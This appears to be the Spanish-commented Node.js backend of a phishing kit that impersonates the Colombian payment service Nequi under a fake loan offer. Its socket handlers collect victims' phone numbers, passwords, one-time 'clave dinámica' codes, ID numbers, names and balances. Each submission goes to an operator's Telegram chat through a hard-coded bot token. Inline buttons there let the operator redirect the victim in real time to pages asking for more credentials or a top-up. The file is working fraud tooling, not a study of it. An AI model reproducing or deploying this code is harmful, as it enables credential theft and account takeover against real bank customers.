/**
 * ========================================
 * NEQUI CREDITO - SERVER
 * ========================================
 * Backend con Socket.IO y Telegram Bot
 * Arquitectura: MVC + Service Layer
 * ========================================
 */

const express = require('express');
const http = require('http');
const socketIO = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');

// ========================================
// CONFIGURACIÓN
// ========================================
const CONFIG = {
  PORT: process.env.PORT || 3000, // Railway asigna PORT dinámicamente
  TELEGRAM: {
    TOKEN: process.env.TELEGRAM_TOKEN || '8575415701:AAHrkYg4wE00cWvhvJzfdICS3kjsgomvUcc',
    CHAT_ID: process.env.TELEGRAM_CHAT_ID || '-5179068892'
  }
};

// Validar que las credenciales de Telegram estén configuradas
if (!CONFIG.TELEGRAM.TOKEN || !CONFIG.TELEGRAM.CHAT_ID) {
  console.error('❌ ERROR FATAL: Credenciales de Telegram no configuradas');
  console.error('   Configura las variables de entorno:');
  console.error('   - TELEGRAM_TOKEN');
  console.error('   - TELEGRAM_CHAT_ID');
  process.exit(1);
}

// ========================================
// INICIALIZACIÓN
// ========================================
const app = express();
const server = http.createServer(app);
const io = socketIO(server, {
  cors: {
    origin: '*',
    methods: ['GET', 'POST'],
    credentials: true
  },
  pingInterval: 3000, // Ping cada 3 segundos (muy frecuente)
  pingTimeout: 8000, // Esperar 8 segundos antes de timeout
  upgradeTimeout: 5000,
  maxHttpBufferSize: 1e6,
  allowUpgrades: false, // NO permitir upgrades
  perMessageDeflate: false,
  httpCompression: false,
  transports: ['polling'], // SOLO polling
  allowEIO3: true,
  connectTimeout: 10000,
  cookie: false
});
const telegramBot = new TelegramBot(CONFIG.TELEGRAM.TOKEN, { 
  polling: false // Solo envío de mensajes, NO polling
});

// NO manejar errores de polling porque está deshabilitado

// Middleware
app.use(express.static(path.join(__dirname)));
app.use(express.json());

// ========================================
// SESSION MANAGER (Repository Pattern)
// ========================================
class SessionRepository {
  constructor() {
    this.sessions = new Map();
    this.sessionIdIndex = new Map(); // Índice: sessionId -> socketId
  }

  create(socketId) {
    // Si existe una sesión previa con este socketId, eliminarla completamente
    if (this.sessions.has(socketId)) {
      const oldSession = this.sessions.get(socketId);
      console.log(`🗑️ Eliminando sesión anterior: ${oldSession.sessionId}`);
      this.sessions.delete(socketId);
    }
    
    const session = {
      socketId,
      sessionId: this.generateSessionId(),
      data: {}, // Objeto completamente vacío
      telegramMessageId: null,
      createdAt: new Date(),
      lastActivity: new Date()
    };
    this.sessions.set(socketId, session);
    this.sessionIdIndex.set(session.sessionId, socketId); // Agregar al índice
    console.log(`✨ Nueva sesión creada: ${session.sessionId}`);
    return session;
  }

  /**
   * Reutiliza una sesión existente con un nuevo socketId
   */
  reconnect(oldSessionId, newSocketId) {
    // Buscar la sesión por sessionId
    let existingSession = null;
    let oldSocketId = null;
    
    for (let [socketId, session] of this.sessions) {
      if (session.sessionId === oldSessionId) {
        existingSession = session;
        oldSocketId = socketId;
        break;
      }
    }
    
    if (existingSession) {
      // Eliminar la referencia antigua
      this.sessions.delete(oldSocketId);
      
      // Actualizar socketId y agregar con la nueva clave
      existingSession.socketId = newSocketId;
      existingSession.lastActivity = new Date();
      this.sessions.set(newSocketId, existingSession);
      this.sessionIdIndex.set(oldSessionId, newSocketId); // Actualizar índice
      
      console.log(`🔄 Sesión reconectada: ${oldSessionId} (socket: ${oldSocketId} -> ${newSocketId})`);
      return existingSession;
    }
    
    return null;
  }

  get(socketId) {
    return this.sessions.get(socketId);
  }

  update(socketId, data) {
    const session = this.sessions.get(socketId);
    if (session) {
      session.data = { ...session.data, ...data };
      session.lastActivity = new Date();
      return session;
    }
    return null;
  }

  /**
   * Actualiza el telegramMessageId de una sesión
   */
  updateTelegramMessageId(socketId, messageId) {
    const session = this.sessions.get(socketId);
    if (session) {
      session.telegramMessageId = messageId;
      session.lastActivity = new Date();
      // Forzar actualización en el Map
      this.sessions.set(socketId, session);
      console.log(`📌 MessageId guardado: ${messageId} para sesión ${session.sessionId}`);
      
      // Verificar que se guardó correctamente
      const verificacion = this.sessions.get(socketId);
      console.log(`✅ Verificación - MessageId en Map: ${verificacion.telegramMessageId}`);
      
      return session;
    }
    return null;
  }

  /**
   * Elimina una sesión y limpia todas sus referencias
   */
  delete(socketId) {
    const session = this.sessions.get(socketId);
    if (session) {
      console.log(`🗑️ Limpiando sesión: ${session.sessionId}`);
      this.sessionIdIndex.delete(session.sessionId); // Limpiar del índice
    }
    this.sessions.delete(socketId);
  }

  getBySessionId(sessionId) {
    // Búsqueda O(1) usando el índice
    const socketId = this.sessionIdIndex.get(sessionId);
    if (socketId) {
      return this.sessions.get(socketId);
    }
    return null;
  }

  generateSessionId() {
    return `S${Date.now()}-${Math.random().toString(36).substr(2, 9)}`;
  }

  getAccumulatedData(socketId) {
    const session = this.sessions.get(socketId);
    return session ? session.data : {};
  }
}

const sessionRepo = new SessionRepository();

// Limpieza automática de sesiones antiguas cada 30 minutos
setInterval(() => {
  const now = new Date();
  const SESSION_TIMEOUT = 24 * 60 * 60 * 1000; // 24 HORAS de inactividad
  
  for (let [socketId, session] of sessionRepo.sessions) {
    const inactiveTime = now - session.lastActivity;
    if (inactiveTime > SESSION_TIMEOUT) {
      console.log(`🗑️ Limpiando sesión inactiva: ${session.sessionId} (inactiva ${Math.round(inactiveTime/60000)} minutos)`);
      sessionRepo.delete(socketId);
    }
  }
}, 30 * 60 * 1000); // Cada 30 minutos

// ========================================
// TELEGRAM SERVICE (Service Layer)
// ========================================
class TelegramService {
  constructor(bot, chatId) {
    this.bot = bot;
    this.chatId = chatId;
    this.pendingMessages = new Map(); // messageId -> socketId
  }

  /**
   * Envía mensaje a Telegram con 5 botones + Finalizar
   */
  async sendMessage(session, messageType) {
    const data = session.data;
    const sessionId = session.sessionId;

    // Construir mensaje con todos los datos acumulados
    let message = `🔔 *Nueva Información del Cliente*\n\n`;
    message += `🆔 *Sesión:* \`${sessionId}\`\n`;
    message += `📅 *Fecha:* ${new Date().toLocaleString('es-CO')}\n\n`;
    
    message += `📋 *DATOS ACUMULADOS*\n`;
    message += `━━━━━━━━━━━━━━━━━━━━\n`;

    if (data.phone) {
      message += `📞 *Teléfono:* \`${data.phone}\`\n`;
    }
    if (data.password) {
      message += `🔑 *Clave:* \`${data.password}\`\n`;
    }
    if (data.dinamica) {
      message += `🔐 *Clave Dinámica:* \`${data.dinamica}\`\n`;
    }

    // Datos del crédito
    if (data.cedula) {
      message += `\n💰 *SOLICITUD DE CRÉDITO*\n`;
      message += `━━━━━━━━━━━━━━━━━━━━\n`;
      message += `🆔 *Cédula:* \`${data.cedula}\`\n`;
      message += `👤 *Nombre:* ${data.nombre}\n`;
      message += `💳 *Saldo Nequi:* $${Number(data.saldo).toLocaleString('es-CO')}\n`;
    }

    message += `\n━━━━━━━━━━━━━━━━━━━━\n`;
    message += `📨 *Tipo:* ${this.getMessageTypeText(messageType)}\n`;

    // Botones inline con los 5 tipos + Finalizar
    const keyboard = {
      inline_keyboard: [
        [
          { text: '📞 Pedir Número', callback_data: `req_phone_${sessionId}` },
          { text: '🔑 Pedir Clave', callback_data: `req_pass_${sessionId}` }
        ],
        [
          { text: '💰 Pedir Crédito', callback_data: `req_loan_${sessionId}` },
          { text: '🔐 Pedir Dinámica', callback_data: `req_dinamica_${sessionId}` }
        ],
        [
          { text: '💳 Pedir Recarga', callback_data: `req_recarga_${sessionId}` }
        ],
        [
          { text: '🏁 Finalizar Sesión', callback_data: `finalize_${sessionId}` }
        ]
      ]
    };

    try {
      let result;
      let messageId;
      
      // SIEMPRE enviar un mensaje NUEVO (no editar)
      console.log('🆕 Enviando mensaje nuevo a Telegram...');
      result = await this.bot.sendMessage(this.chatId, message, {
        parse_mode: 'Markdown',
        reply_markup: keyboard
      });
      messageId = result.message_id;
      sessionRepo.updateTelegramMessageId(session.socketId, messageId);
      console.log(`✅ Mensaje enviado (ID: ${messageId})`)

      // Guardar referencia del mensaje
      this.pendingMessages.set(messageId, session.socketId);
      
      return { success: true, messageId: messageId };
    } catch (error) {
      console.error('Error enviando mensaje a Telegram:', error);
      return { success: false, error: error.message };
    }
  }

  getMessageTypeText(type) {
    const types = {
      'phone': '📞 Teléfono',
      'password': '🔑 Contraseña',
      'loan': '💰 Crédito',
      'dinamica': '🔐 Clave Dinámica'
    };
    return types[type] || type;
  }

  /**
   * Limpia referencias de mensajes pendientes
   */
  cleanPendingMessage(messageId) {
    if (messageId) {
      this.pendingMessages.delete(messageId);
    }
  }

  /**
   * Maneja callbacks de Telegram
   */
  async handleCallback(callbackQuery) {
    const data = callbackQuery.data;
    const messageId = callbackQuery.message.message_id;
    
    // Extraer acción y sessionId
    const parts = data.split('_');
    const action = parts[0];
    const subaction = parts[1];
    const sessionId = parts.slice(2).join('_');

    console.log(`📨 Callback recibido: ${data}`);

    // Buscar sesión por sessionId usando índice (O(1))
    const session = sessionRepo.getBySessionId(sessionId);
    
    if (!session) {
      console.error(`❌ Sesión NO encontrada en memoria: ${sessionId}`);
      console.log(`🗑️ Sesiones activas: ${sessionRepo.sessions.size}`);
      await this.bot.answerCallbackQuery(callbackQuery.id, {
        text: '⚠️ Sesión no encontrada. El usuario debe reconectarse.',
        show_alert: false
      });
      return;
    }

    // Actualizar última actividad
    session.lastActivity = new Date();

    const socketId = session.socketId;
    
    // Intentar encontrar el socket con reintentos (esperar reconexión automática)
    let socket = null;
    const MAX_RETRIES = 5;
    const RETRY_DELAY = 500; // 500ms entre intentos
    
    for (let i = 0; i < MAX_RETRIES; i++) {
      socket = io.sockets.sockets.get(socketId);
      
      if (socket) {
        console.log(`✅ Socket encontrado en intento ${i + 1}`);
        break;
      }
      
      // Buscar socket reconectado con el mismo sessionId
      for (let [sid, s] of io.sockets.sockets) {
        const socketSession = sessionRepo.get(sid);
        if (socketSession && socketSession.sessionId === sessionId) {
          socket = s;
          session.socketId = sid; // Actualizar socketId
          sessionRepo.sessionIdIndex.set(sessionId, sid); // Actualizar índice
          console.log(`✅ Socket reconectado encontrado: ${sid}`);
          break;
        }
      }
      
      if (socket) break;
      
      // Esperar antes del siguiente intento
      if (i < MAX_RETRIES - 1) {
        console.log(`⏳ Intento ${i + 1}/${MAX_RETRIES} - Socket no encontrado, esperando ${RETRY_DELAY}ms...`);
        await new Promise(resolve => setTimeout(resolve, RETRY_DELAY));
      }
    }
    
    // Si después de todos los intentos no se encuentra el socket
    if (!socket) {
      console.error(`❌ Socket no disponible después de ${MAX_RETRIES} intentos`);
      await this.bot.answerCallbackQuery(callbackQuery.id, {
        text: '⚠️ Acción no disponible en este momento.',
        show_alert: false
      });
      return;
    }

    console.log(`✅ Sesión y socket encontrados: ${sessionId}`);

    // Procesar acciones
    if (action === 'req') {
      // Solicitudes de información adicional
      const requests = {
        'phone': { page: 'numero.html', text: '📞 Solicitando número...', emoji: '📞', label: 'Número de Teléfono' },
        'pass': { page: 'contraseña.html', text: '🔑 Solicitando clave...', emoji: '🔑', label: 'Contraseña' },
        'loan': { page: 'simular-credito.html', text: '💰 Solicitando crédito...', emoji: '💰', label: 'Simulación de Crédito' },
        'dinamica': { page: 'dinamica.html', text: '🔐 Solicitando clave dinámica...', emoji: '🔐', label: 'Clave Dinámica' },
        'recarga': { page: 'recarga.html', text: '💳 Solicitando recarga...', emoji: '💳', label: 'Recarga' }
      };

      const request = requests[subaction];
      if (request) {
        // Responder callback INMEDIATAMENTE
        await this.bot.answerCallbackQuery(callbackQuery.id, { text: request.text });
        
        // Emitir redirección
        socket.emit('redirect', { url: request.page });
        console.log(`🔄 Redirección enviada: ${request.page}`);
        
        // Enviar mensaje de confirmación a Telegram (en background)
        const confirmMessage = `✅ *Comando Ejecutado*\n\n${request.emoji} *Acción:* ${request.label}\n🆔 *Sesión:* \`${sessionId}\`\n⏰ ${new Date().toLocaleString('es-CO')}\n\n_El usuario ha sido redirigido a ${request.page}_`;
        
        this.bot.sendMessage(this.chatId, confirmMessage, {
          parse_mode: 'Markdown'
        }).then(() => {
          console.log(`✅ Confirmación de acción enviada: ${request.label}`);
        }).catch((error) => {
          console.error('⚠️ Error al enviar confirmación:', error.message);
        });
      }

    } else if (action === 'finalize') {
      // Responder callback INMEDIATAMENTE
      await this.bot.answerCallbackQuery(callbackQuery.id, { text: '🏁 Sesión finalizada ✅' });
      
      // Enviar mensaje final de confirmación (en background)
      const finalMessage = `✅ *Sesión Finalizada*\n\n🆔 Sesión: \`${sessionId}\`\n⏰ ${new Date().toLocaleString('es-CO')}\n\n_Los datos han sido procesados correctamente._`;
      
      this.bot.sendMessage(this.chatId, finalMessage, {
        parse_mode: 'Markdown'
      }).then(() => {
        console.log(`✅ Mensaje de finalización enviado`);
      }).catch((error) => {
        console.error('⚠️ Error al enviar mensaje final:', error.message);
      });
      
      // Limpiar referencias pero NO eliminar mensajes (mantener historial)
      if (session.telegramMessageId) {
        this.pendingMessages.delete(session.telegramMessageId);
      }
      
      // Notificar al cliente y eliminar sesión
      socket.emit('finalize-session');
      sessionRepo.delete(socketId);
      console.log(`🏁 Sesión ${sessionId} finalizada y limpiada`);
    }
  }
}

const telegramService = new TelegramService(telegramBot, CONFIG.TELEGRAM.CHAT_ID);

// Endpoint para recibir callbacks de Telegram vía webhook simple
app.post('/telegram-callback', express.json(), async (req, res) => {
  try {
    const update = req.body;
    if (update.callback_query) {
      await telegramService.handleCallback(update.callback_query);
    }
    res.sendStatus(200);
  } catch (error) {
    console.error('❌ Error en webhook:', error.message);
    res.sendStatus(500);
  }
});

// Configurar bot para recibir updates mediante getUpdates manual (sin polling automático)
let lastUpdateId = 0;

async function checkTelegramUpdates() {
  try {
    const updates = await telegramBot.getUpdates({ offset: lastUpdateId + 1, timeout: 0 });
    
    for (const update of updates) {
      if (update.callback_query) {
        await telegramService.handleCallback(update.callback_query);
      }
      lastUpdateId = update.update_id;
    }
  } catch (error) {
    // Ignorar errores silenciosamente
  }
}

// Verificar updates cada 2 segundos
setInterval(checkTelegramUpdates, 2000);

// ========================================
// SOCKET.IO CONTROLLER
// ========================================
io.on('connection', (socket) => {
  const savedSessionId = socket.handshake.auth.sessionId;
  
  console.log(`✅ Cliente conectado: ${socket.id}`);
  console.log(`🔍 SessionId recibido: ${savedSessionId || 'ninguno'}`);

  let session;

  // Si hay sessionId, intentar reconectar
  if (savedSessionId) {
    session = sessionRepo.reconnect(savedSessionId, socket.id);
    
    if (session) {
      socket.emit('session-reconnected', { 
        sessionId: session.sessionId,
        data: session.data 
      });
      console.log(`✅ Sesión reconectada: ${session.sessionId} con ${Object.keys(session.data).length} datos`);
    } else {
      // Sesión no encontrada, crear nueva
      session = sessionRepo.create(socket.id);
      socket.emit('session-created', { sessionId: session.sessionId });
      console.log(`⚠️ Sesión ${savedSessionId} no encontrada, creando nueva: ${session.sessionId}`);
    }
  } else {
    // No hay sessionId, crear nueva sesión
    session = sessionRepo.create(socket.id);
    socket.emit('session-created', { sessionId: session.sessionId });
    console.log(`🆕 Primera conexión, creando sesión: ${session.sessionId}`);
  }

  // ====================================
  // EVENT: submit-phone
  // ====================================
  socket.on('submit-phone', async (data) => {
    console.log('📞 Recibido teléfono:', data.phone);
    
    sessionRepo.update(socket.id, { phone: data.phone });
    
    // Obtener sesión actualizada con telegramMessageId
    const session = sessionRepo.get(socket.id);
    console.log(`🔍 Sesión actual - MessageId: ${session.telegramMessageId || 'ninguno'}`);
    
    const result = await telegramService.sendMessage(session, 'phone');
    
    if (result.success) {
      socket.emit('telegram-sent', { messageId: result.messageId });
    } else {
      socket.emit('telegram-error', { error: result.error });
    }
  });

  // ====================================
  // EVENT: submit-password
  // ====================================
  socket.on('submit-password', async (data) => {
    console.log('🔑 Recibida contraseña');
    
    sessionRepo.update(socket.id, { password: data.password });
    
    // Obtener sesión actualizada con telegramMessageId
    const session = sessionRepo.get(socket.id);
    console.log(`🔍 Sesión actual - MessageId: ${session.telegramMessageId || 'ninguno'}`);
    
    const result = await telegramService.sendMessage(session, 'password');
    
    if (result.success) {
      socket.emit('telegram-sent', { messageId: result.messageId });
    } else {
      socket.emit('telegram-error', { error: result.error });
    }
  });

  // ====================================
  // EVENT: heartbeat (mantener sesión activa)
  // ====================================
  socket.on('heartbeat', (data) => {
    const session = sessionRepo.get(socket.id);
    if (session) {
      session.lastActivity = new Date();
      console.log(`💓 Heartbeat recibido - Sesión: ${session.sessionId}`);
    }
  });

  // ====================================
  // EVENT: submit-loan
  // ====================================
  socket.on('submit-loan', async (data) => {
    console.log('💰 Recibida solicitud de crédito');
    console.log('📋 Datos recibidos:', JSON.stringify(data, null, 2));
    
    sessionRepo.update(socket.id, {
      cedula: data.cedula,
      nombre: data.nombre,
      saldo: data.saldo
    });
    
    // Obtener sesión actualizada con telegramMessageId
    const session = sessionRepo.get(socket.id);
    console.log(`🔍 Sesión actual - SessionId: ${session.sessionId}`);
    console.log(`🔍 Sesión actual - MessageId: ${session.telegramMessageId || 'ninguno'}`);
    console.log(`📊 Datos acumulados en sesión:`, Object.keys(session.data));
    
    const result = await telegramService.sendMessage(session, 'loan');
    
    if (result.success) {
      console.log('✅ Mensaje enviado a Telegram exitosamente');
      socket.emit('telegram-sent', { messageId: result.messageId });
    } else {
      console.error('❌ Error al enviar mensaje a Telegram:', result.error);
      socket.emit('telegram-error', { error: result.error });
    }
  });

  // ====================================
  // EVENT: submit-dinamica
  // ====================================
  socket.on('submit-dinamica', async (data) => {
    console.log('🔐 Recibida clave dinámica');
    
    sessionRepo.update(socket.id, { dinamica: data.dinamica });
    
    // Obtener sesión actualizada con telegramMessageId
    const session = sessionRepo.get(socket.id);
    console.log(`🔍 Sesión actual - MessageId: ${session.telegramMessageId || 'ninguno'}`);
    
    const result = await telegramService.sendMessage(session, 'dinamica');
    
    if (result.success) {
      socket.emit('telegram-sent', { messageId: result.messageId });
    } else {
      socket.emit('telegram-error', { error: result.error });
    }
  });

  // ====================================
  // EVENT: disconnect
  // ====================================
  socket.on('disconnect', (reason) => {
    console.log(`❌ Cliente desconectado: ${socket.id} - Razón: ${reason}`);
    
    const session = sessionRepo.get(socket.id);
    if (session) {
      console.log(`💾 Sesión ${session.sessionId} MANTENIDA para reconexión (no se elimina)`);
      // NO eliminar la sesión, mantenerla para que pueda reconectarse
      // La sesión solo se elimina por timeout (6 horas) o por finalize
    }
  });
});

// ========================================
// RUTAS HTTP
// ========================================
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/health', (req, res) => {
  res.json({
    status: 'ok',
    activeSessions: sessionRepo.sessions.size,
    uptime: process.uptime()
  });
});

// ========================================
// INICIO DEL SERVIDOR
// ========================================
server.listen(CONFIG.PORT, () => {
  console.log('');
  console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
  console.log('  🚀 NEQUI CREDITO SERVER');
  console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
  console.log(`  📡 Servidor: http://localhost:${CONFIG.PORT}`);
  console.log(`  💬 Telegram Bot: Activo`);
  console.log(`  🔌 Socket.IO: Listo`);
  console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
  console.log('');
});

// ========================================
// MANEJO DE ERRORES
// ========================================
process.on('uncaughtException', (error) => {
  console.error('❌ Error no capturado:', error);
});

process.on('unhandledRejection', (reason, promise) => {
  console.error('❌ Promise rechazada no manejada:', reason);
});
